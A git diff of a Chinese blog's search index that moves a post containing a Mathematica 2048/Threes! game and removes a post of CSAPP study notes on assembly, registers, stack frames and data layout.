@@ -1,28 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2048的又一次改良</title>
-    <url>/2021/08/02/2048plus.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>闲来无事，我扒出了十年前在网上复制粘贴的mma2048代码，并对其进行了改良，将2048与Threes!结合起来，形成了如下代码。</p>
-<span id="more"></span>
-<p>（由于涉及键盘操作，网页版的编译器无法操作，请自行下载mma8.0及以上版本运行）</p>
-<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">挪<span class="punctuation">[</span>左<span class="punctuation">]</span> <span class="operator">=</span> <span class="type">#</span> <span class="operator">//.</span> <span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="type">x___</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="type">a_</span> <span class="operator">/;</span> <span class="variable">a</span> <span class="operator">&gt;</span> <span class="number">1</span><span class="operator">,</span> <span class="type">y___</span><span class="punctuation">&#125;</span> <span class="operator">:&gt;</span> <span class="punctuation">&#123;</span><span class="variable">x</span><span class="operator">,</span> <span class="variable">a</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="variable">y</span><span class="punctuation">&#125;</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="type">x___</span><span class="operator">,</span> </span><br><span class="line">        <span class="type">a_</span> <span class="operator">/;</span> <span class="variable">a</span> <span class="operator">&gt;</span> <span class="number">1</span><span class="operator">,</span> <span class="type">a_</span><span class="operator">,</span> <span class="type">y___</span><span class="punctuation">&#125;</span> <span class="operator">:&gt;</span> <span class="punctuation">&#123;</span><span class="variable">x</span><span class="operator">,</span> <span class="number">2</span> 抓住<span class="punctuation">[</span><span class="variable">a</span><span class="punctuation">]</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="variable">y</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span> <span class="operator">/.</span> 抓住<span class="punctuation">[</span><span class="type">a_</span><span class="punctuation">]</span> <span class="operator">:&gt;</span> <span class="variable">a</span> <span class="operator">&amp;;</span></span><br><span class="line">挪<span class="punctuation">[</span>上<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Transpose</span><span class="operator">,</span> 挪<span class="punctuation">[</span>左<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Transpose</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">挪<span class="punctuation">[</span>下<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Reverse</span><span class="operator">,</span> 挪<span class="punctuation">[</span>上<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Reverse</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">挪<span class="punctuation">[</span>右<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Transpose</span><span class="operator">,</span> 挪<span class="punctuation">[</span>下<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Transpose</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">加块瓦 <span class="operator">=</span> <span class="built_in">ReplacePart</span><span class="punctuation">[</span><span class="type">#</span><span class="operator">,</span> <span class="built_in">RandomChoice</span><span class="operator">@</span><span class="built_in">Position</span><span class="punctuation">[</span><span class="type">#</span><span class="operator">,</span> <span class="number">1</span><span class="punctuation">]</span> <span class="operator">-&gt;</span> <span class="built_in">RandomChoice</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="number">2</span><span class="operator">,</span> <span class="number">3</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span> <span class="operator">&amp;;</span></span><br><span class="line">按键 <span class="operator">=</span> <span class="built_in">If</span><span class="punctuation">[</span>格子 <span class="operator">!=</span> 挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="operator">,</span> 格子 <span class="operator">=</span> 加块瓦<span class="punctuation">[</span>挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span> 总分 <span class="operator">=</span> <span class="built_in">Total</span><span class="punctuation">[</span><span class="built_in">Total</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">    <span class="built_in">Which</span><span class="punctuation">[</span><span class="built_in">And</span> <span class="operator">@@</span> <span class="punctuation">(</span>格子 <span class="operator">==</span> 挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span> <span class="operator">&amp;</span> <span class="operator">/@</span> <span class="punctuation">&#123;</span>左<span class="operator">,</span> 右<span class="operator">,</span> 上<span class="operator">,</span> 下<span class="punctuation">&#125;</span><span class="punctuation">)</span><span class="operator">,</span> </span><br><span class="line">     状态 <span class="operator">=</span> <span class="string">&quot;你的得分为&quot;</span> <span class="built_in">ToString</span><span class="punctuation">[</span>总分<span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">]</span> <span class="operator">&amp;;</span></span><br><span class="line">格子 <span class="operator">=</span> 加块瓦<span class="punctuation">[</span><span class="built_in">ConstantArray</span><span class="punctuation">[</span><span class="number">1</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">5</span><span class="operator">,</span> <span class="number">5</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">状态 <span class="operator">=</span> <span class="string">&quot;&quot;</span><span class="operator">;</span></span><br><span class="line"><span class="built_in">EventHandler</span><span class="punctuation">[</span></span><br><span class="line"> <span class="built_in">Dynamic</span><span class="punctuation">[</span><span class="built_in">ArrayPlot</span><span class="punctuation">[</span><span class="built_in">Log2</span><span class="operator">@</span>格子<span class="operator">/</span><span class="number">17</span><span class="operator">,</span> <span class="built_in">ColorFunction</span> <span class="operator">-&gt;</span> <span class="built_in">Hue</span><span class="operator">,</span> </span><br><span class="line">   <span class="built_in">ColorFunctionScaling</span> <span class="operator">-&gt;</span> <span class="built_in">False</span><span class="operator">,</span> <span class="built_in">Mesh</span> <span class="operator">-&gt;</span> <span class="built_in">All</span><span class="operator">,</span> </span><br><span class="line">   <span class="built_in">Epilog</span> <span class="operator">-&gt;</span> <span class="punctuation">&#123;</span><span class="built_in">MapIndexed</span><span class="punctuation">[</span></span><br><span class="line">      <span class="built_in">Text</span><span class="punctuation">[</span><span class="built_in">If</span><span class="punctuation">[</span><span class="type">#1</span> <span class="operator">==</span> <span class="number">1</span><span class="operator">,</span> <span class="string">&quot;&quot;</span><span class="operator">,</span> <span class="built_in">Style</span><span class="punctuation">[</span><span class="type">#1</span><span class="operator">,</span> <span class="string">&quot;Section&quot;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">,</span> <span class="type">#2</span> <span class="operator">-</span> <span class="punctuation">&#123;</span><span class="number">0.5</span><span class="operator">,</span> <span class="number">0.5</span><span class="punctuation">&#125;</span><span class="punctuation">]</span> <span class="operator">&amp;,</span> </span><br><span class="line">      <span class="built_in">Transpose</span><span class="operator">@</span><span class="built_in">Reverse</span><span class="operator">@</span>格子<span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">2</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="operator">,</span> </span><br><span class="line">     <span class="built_in">Text</span><span class="punctuation">[</span><span class="built_in">Style</span><span class="punctuation">[</span>状态<span class="operator">,</span> <span class="built_in">Blue</span><span class="operator">,</span> <span class="number">24</span><span class="punctuation">]</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">2.5</span><span class="operator">,</span> <span class="number">2</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="string">&quot;LeftArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> </span><br><span class="line">   按键<span class="punctuation">[</span>左<span class="punctuation">]</span><span class="operator">,</span> <span class="string">&quot;RightArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>右<span class="punctuation">]</span><span class="operator">,</span> <span class="string">&quot;UpArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>上<span class="punctuation">]</span><span class="operator">,</span> </span><br><span class="line">  <span class="string">&quot;DownArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>下<span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
-<p>计分方式就是所有数字的和，不是2048合成就加分的方式，因此得分会缩水50%左右。</p>
-<p>感觉这个版本的难度增加了不少，目前最高分621，我太菜了，有能力的可以在评论区晒分截图。</p>
-<head>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
-  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
-  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"></script>
-</head>
-]]></content>
-      <categories>
-        <category>develop</category>
-      </categories>
-      <tags>
-        <tag>mma</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>二一——再见，鼠标</title>
     <url>/2021/10/24/1024.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h1><p>为了提高工作效率，以及出于对手腕健康的考虑（现在已经有一定程度的肿胀磨损）。在这个<strong>特殊的日子</strong>，我鼠标的最后一点电耗尽之际，我决心抛弃鼠标，将<strong>几乎</strong>所有的操作全部转移到键盘上。</p>
@@ -128,6 +106,28 @@
       <categories>
         <category>随笔</category>
       </categories>
+  </entry>
+  <entry>
+    <title>2048的又一次改良</title>
+    <url>/2021/08/02/2048plus.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>闲来无事，我扒出了十年前在网上复制粘贴的mma2048代码，并对其进行了改良，将2048与Threes!结合起来，形成了如下代码。</p>
+<span id="more"></span>
+<p>（由于涉及键盘操作，网页版的编译器无法操作，请自行下载mma8.0及以上版本运行）</p>
+<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">挪<span class="punctuation">[</span>左<span class="punctuation">]</span> <span class="operator">=</span> <span class="type">#</span> <span class="operator">//.</span> <span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="type">x___</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="type">a_</span> <span class="operator">/;</span> <span class="variable">a</span> <span class="operator">&gt;</span> <span class="number">1</span><span class="operator">,</span> <span class="type">y___</span><span class="punctuation">&#125;</span> <span class="operator">:&gt;</span> <span class="punctuation">&#123;</span><span class="variable">x</span><span class="operator">,</span> <span class="variable">a</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="variable">y</span><span class="punctuation">&#125;</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="type">x___</span><span class="operator">,</span> </span><br><span class="line">        <span class="type">a_</span> <span class="operator">/;</span> <span class="variable">a</span> <span class="operator">&gt;</span> <span class="number">1</span><span class="operator">,</span> <span class="type">a_</span><span class="operator">,</span> <span class="type">y___</span><span class="punctuation">&#125;</span> <span class="operator">:&gt;</span> <span class="punctuation">&#123;</span><span class="variable">x</span><span class="operator">,</span> <span class="number">2</span> 抓住<span class="punctuation">[</span><span class="variable">a</span><span class="punctuation">]</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="variable">y</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span> <span class="operator">/.</span> 抓住<span class="punctuation">[</span><span class="type">a_</span><span class="punctuation">]</span> <span class="operator">:&gt;</span> <span class="variable">a</span> <span class="operator">&amp;;</span></span><br><span class="line">挪<span class="punctuation">[</span>上<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Transpose</span><span class="operator">,</span> 挪<span class="punctuation">[</span>左<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Transpose</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">挪<span class="punctuation">[</span>下<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Reverse</span><span class="operator">,</span> 挪<span class="punctuation">[</span>上<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Reverse</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">挪<span class="punctuation">[</span>右<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Transpose</span><span class="operator">,</span> 挪<span class="punctuation">[</span>下<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Transpose</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">加块瓦 <span class="operator">=</span> <span class="built_in">ReplacePart</span><span class="punctuation">[</span><span class="type">#</span><span class="operator">,</span> <span class="built_in">RandomChoice</span><span class="operator">@</span><span class="built_in">Position</span><span class="punctuation">[</span><span class="type">#</span><span class="operator">,</span> <span class="number">1</span><span class="punctuation">]</span> <span class="operator">-&gt;</span> <span class="built_in">RandomChoice</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="number">2</span><span class="operator">,</span> <span class="number">3</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span> <span class="operator">&amp;;</span></span><br><span class="line">按键 <span class="operator">=</span> <span class="built_in">If</span><span class="punctuation">[</span>格子 <span class="operator">!=</span> 挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="operator">,</span> 格子 <span class="operator">=</span> 加块瓦<span class="punctuation">[</span>挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span> 总分 <span class="operator">=</span> <span class="built_in">Total</span><span class="punctuation">[</span><span class="built_in">Total</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">    <span class="built_in">Which</span><span class="punctuation">[</span><span class="built_in">And</span> <span class="operator">@@</span> <span class="punctuation">(</span>格子 <span class="operator">==</span> 挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span> <span class="operator">&amp;</span> <span class="operator">/@</span> <span class="punctuation">&#123;</span>左<span class="operator">,</span> 右<span class="operator">,</span> 上<span class="operator">,</span> 下<span class="punctuation">&#125;</span><span class="punctuation">)</span><span class="operator">,</span> </span><br><span class="line">     状态 <span class="operator">=</span> <span class="string">&quot;你的得分为&quot;</span> <span class="built_in">ToString</span><span class="punctuation">[</span>总分<span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">]</span> <span class="operator">&amp;;</span></span><br><span class="line">格子 <span class="operator">=</span> 加块瓦<span class="punctuation">[</span><span class="built_in">ConstantArray</span><span class="punctuation">[</span><span class="number">1</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">5</span><span class="operator">,</span> <span class="number">5</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">状态 <span class="operator">=</span> <span class="string">&quot;&quot;</span><span class="operator">;</span></span><br><span class="line"><span class="built_in">EventHandler</span><span class="punctuation">[</span></span><br><span class="line"> <span class="built_in">Dynamic</span><span class="punctuation">[</span><span class="built_in">ArrayPlot</span><span class="punctuation">[</span><span class="built_in">Log2</span><span class="operator">@</span>格子<span class="operator">/</span><span class="number">17</span><span class="operator">,</span> <span class="built_in">ColorFunction</span> <span class="operator">-&gt;</span> <span class="built_in">Hue</span><span class="operator">,</span> </span><br><span class="line">   <span class="built_in">ColorFunctionScaling</span> <span class="operator">-&gt;</span> <span class="built_in">False</span><span class="operator">,</span> <span class="built_in">Mesh</span> <span class="operator">-&gt;</span> <span class="built_in">All</span><span class="operator">,</span> </span><br><span class="line">   <span class="built_in">Epilog</span> <span class="operator">-&gt;</span> <span class="punctuation">&#123;</span><span class="built_in">MapIndexed</span><span class="punctuation">[</span></span><br><span class="line">      <span class="built_in">Text</span><span class="punctuation">[</span><span class="built_in">If</span><span class="punctuation">[</span><span class="type">#1</span> <span class="operator">==</span> <span class="number">1</span><span class="operator">,</span> <span class="string">&quot;&quot;</span><span class="operator">,</span> <span class="built_in">Style</span><span class="punctuation">[</span><span class="type">#1</span><span class="operator">,</span> <span class="string">&quot;Section&quot;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">,</span> <span class="type">#2</span> <span class="operator">-</span> <span class="punctuation">&#123;</span><span class="number">0.5</span><span class="operator">,</span> <span class="number">0.5</span><span class="punctuation">&#125;</span><span class="punctuation">]</span> <span class="operator">&amp;,</span> </span><br><span class="line">      <span class="built_in">Transpose</span><span class="operator">@</span><span class="built_in">Reverse</span><span class="operator">@</span>格子<span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">2</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="operator">,</span> </span><br><span class="line">     <span class="built_in">Text</span><span class="punctuation">[</span><span class="built_in">Style</span><span class="punctuation">[</span>状态<span class="operator">,</span> <span class="built_in">Blue</span><span class="operator">,</span> <span class="number">24</span><span class="punctuation">]</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">2.5</span><span class="operator">,</span> <span class="number">2</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="string">&quot;LeftArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> </span><br><span class="line">   按键<span class="punctuation">[</span>左<span class="punctuation">]</span><span class="operator">,</span> <span class="string">&quot;RightArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>右<span class="punctuation">]</span><span class="operator">,</span> <span class="string">&quot;UpArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>上<span class="punctuation">]</span><span class="operator">,</span> </span><br><span class="line">  <span class="string">&quot;DownArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>下<span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+<p>计分方式就是所有数字的和，不是2048合成就加分的方式，因此得分会缩水50%左右。</p>
+<p>感觉这个版本的难度增加了不少，目前最高分621，我太菜了，有能力的可以在评论区晒分截图。</p>
+<head>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"></script>
+</head>
+]]></content>
+      <categories>
+        <category>develop</category>
+      </categories>
+      <tags>
+        <tag>mma</tag>
+      </tags>
   </entry>
   <entry>
     <title>bandit通关记录</title>
@@ -344,151 +344,6 @@
 ]]></content>
       <categories>
         <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>（近期不更新）csapp学习笔记</title>
-    <url>/2022/01/15/csapp.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>（本文汇编代码统一采用AT&amp;T语法）</p>
-<blockquote>
-<p>友情提示：</p>
-<p>看这本书，笔记、习题、实验三者缺一不可。</p>
-<p>如果你觉得中文翻译质量欠佳，想选择英文原版阅读，那么千万不要选择Global Edition！因为Global Edition的习题环节错误百出，有许多题答案根本无法与题目相对应，严重影响阅读体验和对知识的理解！（我就是白嫖了github上面的免费资源，虽然不是影印版，而且正文质量很高，但习题这个问题就可以盖过其他所有优点）。我现在不得不边看英文原文边做中文版本上的习题(lll￢ω￢)</p>
-</blockquote>
-<span id="more"></span>
-<h1 id="计算机系统漫游"><a href="#计算机系统漫游" class="headerlink" title="计算机系统漫游"></a>计算机系统漫游</h1><p>一个接下所有章节的outline，<del>可以作为计算机系统导论的复习材料。</del></p>
-<h1 id="信息的表示和处理"><a href="#信息的表示和处理" class="headerlink" title="信息的表示和处理"></a>信息的表示和处理</h1><p>之前草草看过一遍，没做题，现在都搞不清楚浮点数的<strong>最小/最大非规格化数</strong>和<strong>最小/最大规格化数</strong>是怎么算出来的。</p>
-<p>有空再填坑。</p>
-<h1 id="程序的机器级表示"><a href="#程序的机器级表示" class="headerlink" title="程序的机器级表示"></a>程序的机器级表示</h1><h2 id="历史观点"><a href="#历史观点" class="headerlink" title="历史观点"></a>历史观点</h2><p>讲了一下Intel处理器的历史，顺便提了一下SSE和AVX指令集（我觉得自己将来都要学的，又要开始秃头了(lll￢ω￢)</p>
-<h2 id="程序编码"><a href="#程序编码" class="headerlink" title="程序编码"></a>程序编码</h2><p>如何在linux环境下查看gcc编译的AT&amp;T格式的汇编代码。（其实gdb提供了变更格式为intel的操作）</p>
-<h2 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h2><ul>
-<li>char</li>
-<li>short</li>
-<li>int</li>
-<li>long（即long long，下同）</li>
-<li>float</li>
-<li>double</li>
-<li>指针（本书是64位环境，所有指针均为8字节）</li>
-</ul>
-<h2 id="访问信息"><a href="#访问信息" class="headerlink" title="访问信息"></a>访问信息</h2><p>各种寄存器（rax~rdx，rsi，rdi，rbp，rsp，r8~r15，及对应的32位、16位、8位版本）及<strong>约定俗成的</strong>用法见下图。</p>
-<p><img src="/2022/01/15/csapp/reg.png"></p>
-<p>mov指令（movq、movl、movw、movb、movzbw、movsbq等，后两者是类型强转）。</p>
-<h2 id="算术和逻辑操作"><a href="#算术和逻辑操作" class="headerlink" title="算术和逻辑操作"></a>算术和逻辑操作</h2><p>lea——取地址，外加简单算术指令，类似于a+b*c的形式（表示字节数的q、l、w、b字母省略，下同）</p>
-<p>sf、zf、pf、cf、af、of——各种标志符(flag)</p>
-<p>add、sub、(i)mul、(i)div、shl(sal)、shr、sar——改变flag状态</p>
-<p>inc、dec——不改变flag状态</p>
-<p>cqto——64位转128位，做128位除法有用</p>
-<h2 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h2><p>if、switch、while、do-while、for的汇编实现，这部分作业错误尤其多。</p>
-<p>由于cpu具有分支预测的功能（部分语句准确率可达90%），简单if语句会预先计算两种分支之后寄存器的变化，以提高cpu的运行速度。</p>
-<p>对于多分支、取值接近的switch语句，编译器会构造跳表来代替各种jz、jbe等判断语句，以提高代码执行效率，因为跳表的执行速度不受分支个数的影响。</p>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>再一次复习堆栈调用的汇编实现，将一个栈帧的各个部分（return address, saved registers, local variables, argument build area）都讲到了，很细致。</p>
-<p>64位寄存器传参的顺序为<code>%rdi</code>,<code>%rsi</code>,<code>%rdx</code>,<code>%rcx</code>,<code>%r8</code>,<code>%r9</code>.</p>
-<h2 id="数组分配和访问"><a href="#数组分配和访问" class="headerlink" title="数组分配和访问"></a>数组分配和访问</h2><p>lea指令的作用就是专门为访问数组设计的。</p>
-<p>虽然编译器更喜欢使用指针遍历数组，加上一个固定的值。即使是多维数组遍历，也尽量不用我们数据结构课学到的i*Wid+j这个公式——毕竟乘法太费时间了。</p>
-<h2 id="异数的数据结构——1-15-2022"><a href="#异数的数据结构——1-15-2022" class="headerlink" title="异数的数据结构——1/15/2022"></a>异数的数据结构——1/15/2022</h2><p>讲了struct、union和空间对齐。</p>
-<p><strong>union中的大小是其中最大数据类型的大小。</strong></p>
-<p>使用union可以强转数据类型（比如说把double转成unsigned long）。</p>
-<p>结构体中的每一项数据的地址都必须是其类型大小的整数倍。</p>
-<h2 id="在机器级程序中将控制与数据结合起来——1-16-2022"><a href="#在机器级程序中将控制与数据结合起来——1-16-2022" class="headerlink" title="在机器级程序中将控制与数据结合起来——1/16/2022"></a>在机器级程序中将控制与数据结合起来——1/16/2022</h2><p>指针与地址运算的优先级——判断以下程序的输出结果：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">20</span>]=&#123;<span class="number">10</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *p=&amp;arr;</span><br><span class="line">	*(p+<span class="number">8</span>)+=<span class="number">9</span>;</span><br><span class="line">	<span class="keyword">int</span> m=*((<span class="keyword">char</span>*)p+<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> n=*((<span class="keyword">char</span>*)(p+<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>,m,n);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>答案是<code>8 11</code>.</p>
-<p>int (*p)(int, *int)——函数指针，用<code>p = fun</code>调用，用<code>res = p(int, &amp;int)</code>返回int。</p>
-<p>int *p(int, *int)——指针函数，返回一个int*指针。</p>
-<p>gdb的各种调试命令（对于安了peda的人，就b、si、ni、x/s、x/wx可能有点用，因为peda把寄存器、汇编、堆栈啥都给你显示完了）：</p>
-<p><img src="/2022/01/15/csapp/gdb.png"></p>
-<blockquote>
-<p>习题3.46的<strong>正文</strong>错误：</p>
-<p>global edition: <code>get_line</code> is called with the return address equal to <del>0x400776</del> 0x400076.</p>
-<p>Chinese edition: 字符 0~9 的 ASCII 码是 <del>0x3~0x39</del> 0x30~0x39.</p>
-</blockquote>
-<p>在堆栈图中，地址从下到上，从右到左逐渐增大。因此对于一个dword(qword)，数据的储存方式是从左到右（小端序）；而单个字节的储存方式是从右到左。</p>
-<blockquote>
-<p>疑问：</p>
-<p>D题中，当<code>get_line</code>函数返回时，损毁的寄存器应该还有%rip，而不只是答案所说的%rbx.</p>
-</blockquote>
-<p>防止栈溢出的三种主要方式：地址空间随机化（ASLR）、栈保护（canary）和内存不可执行（NX）。</p>
-<p>对长度可变栈的汇编支持——栈底指针rbp：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pushq %rbp</span><br><span class="line">movq %rsp, %rbp</span><br><span class="line">;procedure in the function</span><br><span class="line">leave </span><br><span class="line">;movq %rbp, %rsp</span><br><span class="line">;popq %rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
-<p><del>书上说最近的编译器取消了使用栈底指针的惯例</del>实际上，我用最新的编译器，随便写个hello world都会使用栈底指针，这个惯例依旧保持着。</p>
-<blockquote>
-<p>疑问：</p>
-<p>课后习题的B题为什么s2舍入到“最近的8的倍数”，D题为什么“保留s1的偏移量为最近的16的倍数”？</p>
-</blockquote>
-<h2 id="浮点代码——1-19-2022"><a href="#浮点代码——1-19-2022" class="headerlink" title="浮点代码——1/19/2022"></a>浮点代码——1/19/2022</h2><p>寄存器：</p>
-<p>%ymm0~%ymm15是256位的浮点寄存器。</p>
-<p>%xmm0~%xmm15是128位的浮点寄存器，处于ymm的低128位。</p>
-<p>前8个寄存器可视为函数参数（特别地，%xmm0为<strong>约定俗成</strong>的返回值，类似于%rax），后8个由调用者保存。</p>
-<p>在内存与寄存器中移动浮点数：</p>
